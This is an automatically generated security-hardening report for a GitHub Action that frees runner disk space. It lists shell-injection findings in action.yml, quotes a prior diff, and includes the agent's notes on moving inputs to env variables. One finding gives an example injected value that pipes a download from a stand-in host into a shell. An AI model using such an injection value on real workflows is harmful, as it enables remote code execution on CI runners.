<!-- markdownlint-disable -->

# Hardening Report: jlumbroso--free-disk-space/v1.3.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **jlumbroso--free-disk-space/v1.3.1** was hardened automatically. 9 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): the composite step's run: block puts input expressions straight into bash conditionals. The lines are `if [[ ${{ inputs.android }} == 'true' ]]; then` and the same test for inputs.dotnet, inputs.haskell, inputs.large-packages, inputs.docker-images, inputs.tool-cache and inputs.swap-storage. A calling workflow that passes an attacker-controlled value can inject shell commands, for example `x ]] || curl evil | sh; [[ x`. Fix: map each input to an env: variable and compare it quoted, e.g. `if [[ "$INPUT_ANDROID" == 'true' ]]`.

Locations:

- `action.yml:133`
- `action.yml:145`
- `action.yml:158`
- `action.yml:173`
- `action.yml:195`
- `action.yml:207`
- `action.yml:219`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.android }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:133`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.dotnet }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:145`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.haskell }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:158`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.large-packages }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:172`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.docker-images }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:194`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.tool-cache }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:207`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.swap-storage }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:219`

### prior-fix (severity: high)

Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed action.yml without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
```diff
diff --git a/action.yml b/action.yml
index bb3dcb9..3d744f8 100644
--- a/action.yml
+++ b/action.yml
@@ -1,11 +1,9 @@
 name: "Free Disk Space (Ubuntu)"
 description: "A configurable GitHub Action to free up disk space on an Ubuntu GitHub Actions runner."
-
 # See: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#branding
 branding:
   icon: "trash-2"
   color: "green"
-
 inputs:
   android:
     description: "Remove Android runtime"
@@ -19,229 +17,53 @@ inputs:
     description: "Remove Haskell runtime"
     required: false
     default: "true"
-
   # option inspired by:
   # https://github.com/apache/flink/blob/master/tools/azure-pipelines/free_disk_space.sh
   large-packages:
     description: "Remove large packages"
     required: false
     default: "true"
-
   docker-images:
     description: "Remove Docker images"
     required: false
     default: "true"
-
   # option inspired by:
   # https://github.com/actions/virtual-environments/issues/2875#issuecomment-1163392159
   tool-cache:
     description: "Remove image tool cache"
     required: false
     default: "false"
-
   swap-storage:
     description: "Remove swap storage"
     required: false
     default: "true"
-
 runs:
   using: "composite"
   steps:
-    - shell: bash
       run: |
-
-        # ======
-        # MACROS
-        # ======
-
-        # macro to print a line of equals
-        # (silly but works)
-        printSeparationLine() {
-          str=${1:=}
-          num=${2:-80}
-          counter=1
-          output=""
-          while [ $counter -le $num ]
-          do
-             output="${output}${str}"
-             counter=$((counter+1))
-          done
-          echo "${output}"
-        }
-
-        # macro to compute available space
-        # REF: https://unix.stackexchange.com/a/42049/60849
-        # REF: https://stackoverflow.com/a/450821/408734
-        getAvailableSpace() { echo $(df -a $1 | awk 'NR > 1 {avail+=$4} END {print avail}'); }
-
-        # macro to make Kb human readable (assume the input is Kb)
-        # REF: https://unix.stackexchange.com/a/44087/60849
-        formatByteCount() { echo $(numfmt --to=iec-i --suffix=B --padding=7 $1'000'); }
-
-        # macro to output saved space
-        printSavedSpace() {
-          saved=${1}
-          title=${2:-}
-
-          echo ""
-          printSeparationLine '*' 80
-          if [ ! -z "${title}" ]; then
-            echo "=> ${title}: Saved $(formatByteCount $saved)"
-          else
-            echo "=> Saved $(formatByteCount $saved)"
-          fi
-          printSeparationLine '*' 80
-          echo ""
-        }
-
-        # macro to print output of dh with caption
-        printDH() {
-          caption=${1:-}
-
-          printSeparationLine '=' 80
-          echo "${caption}"
-          echo ""
-          echo "$ dh -h /"
-          echo ""
-          df -h /
-          echo "$ dh -a /"
-          echo ""
-          df -a /
-          echo "$ dh -a"
-          echo ""
-          df -a
-          printSeparationLine '=' 80
-        }
-
-
-
-        # ======
-        # SCRIPT
-        # ======
-
-        # Display initial disk space stats
-
-        AVAILABLE_INITIAL=$(getAvailableSpace)
-        AVAILABLE_ROOT_INITIAL=$(getAvailableSpace '/')
-
-        printDH "BEFORE CLEAN-UP:"
-        echo ""
-
-
-        # Option: Remove Android library
-
-        if [[ ${{ inputs.android }} == 'true' ]]; then
-          BEFORE=$(getAvailableSpace)
-          
-          sudo rm -rf /usr/local/lib/android || true
-
-          AFTER=$(getAvailableSpace)
-          SAVED=$((AFTER-BEFORE))
-          printSavedSpace $SAVED "Android library"
-        fi
-
-        # Option: Remove .NET runtime
-
-        if [[ ${{ inputs.dotnet }} == 'true' ]]; then
-          BEFORE=$(getAvailableSpace)
-
-          # https://github.community/t/bigger-github-hosted-runners-disk-space/17267/11
-          sudo rm -rf /usr/share/dotnet || true
-          
-          AFTER=$(getAvailableSpace)
-          SAVED=$((AFTER-BEFORE))
-          printSavedSpace $SAVE
... (truncated)
```

Locations:

- `action.yml`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, prior-fix

**Notes:**

I fixed the script injection in `action.yml`. The seven inputs (android, dotnet, haskell, large-packages, docker-images, tool-cache, swap-storage) are now passed into the step through its `env:` block as `INPUT_*` variables. The bash checks compare them quoted, e.g. `if [[ "$INPUT_ANDROID" == 'true' ]]`. A search confirms the input expressions now appear only in `env:` and not in the `run:` script. Nothing else in the script changed.

One problem along the way: I made the eight edits in parallel and they scrambled the file, mixing text into the wrong lines. I rewrote the whole file from the original content with only the intended changes, and checked the result.

The prior-fix finding is covered by the same change. The earlier patch shown in it also deleted blank lines between the inputs and appears to drop the `- shell: bash` line. I didn't copy either of those: the blank lines don't matter for security, and without `shell: bash` the step wouldn't run.

Nothing has been run: there was no test run of the action after the change.

